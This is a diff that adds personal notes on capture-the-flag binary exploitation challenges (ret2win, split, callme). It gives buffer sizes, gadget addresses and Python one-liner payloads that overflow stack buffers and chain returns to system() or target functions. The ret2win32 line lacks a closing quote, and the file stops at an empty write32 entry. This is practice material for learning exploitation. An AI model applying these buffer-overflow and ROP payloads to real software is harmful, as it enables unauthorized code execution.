@@ -1,0 +1,43 @@
+ret2win32:
+buffer size = 40 bytes
+ret2win(): 0x08048659
+payload: python -c 'print "\x41"*44 + "\x59\x86\x04\x08"
+
+
+
+ret2win64:
+buffer size = 32 bytes
+ret2win(): 0x0000000000400811
+payload: python -c 'print "\x41"*40 + "\x11\x08\x40\x00\x00\x00\x00\x00"'
+
+
+
+split32:
+"/bin/cat flag.txt": 0x0804a030
+system(): 0x08048430
+buffer size: 40 bytes
+payload: python -c 'print "\x41"*44 + "\x30\x84\x04\x08" + "\x42"*4 + "\x30\xa0\x04\x08"'
+
+
+
+split64:
+"/bin/cat flag.txt": 0x00601060
+system(): 0x4005e0
+"pop rdi" gadget: 0x400883
+buffer size: 32 bytes
+payload: python -c 'print "\x41"*40 + "\x83\x08\x40\x00\x00\x00\x00\x00" + "\x60\x10\x60\x00\x00\x00\x00\x00" + "\xe0\x05\x40\x00\x00\x00\x00\x00"'
+
+
+
+callme32:
+callme_one(): 0x080485c0
+callme_two(): 0x08048620
+callme_three(): 0x080485b0
+"pop pop pop" gadget: 0x080488a9
+buffer: 40 bytes
+payload: python -c 'print "\x41"*44 + "\xc0\x85\x04\x08" + "\xa9\x88\x04\x08" + "\x01\x00\x00\x00" + "\x02\x00\x00\x00" + "\x03\x00\x00\x00" + "\x20\x86\x04\x08" + "\xa9\x88\x04\x08" + "\x01\x00\x00\x00" + "\x02\x00\x00\x00" + "\x03\x00\x00\x00" + "\xb0\x85\x04\x08"  + "\xa9\x88\x04\x08" + "\x01\x00\x00\x00" + "\x02\x00\x00\x00" + "\x03\x00\x00\x00"'
+
+
+
+write32:
+
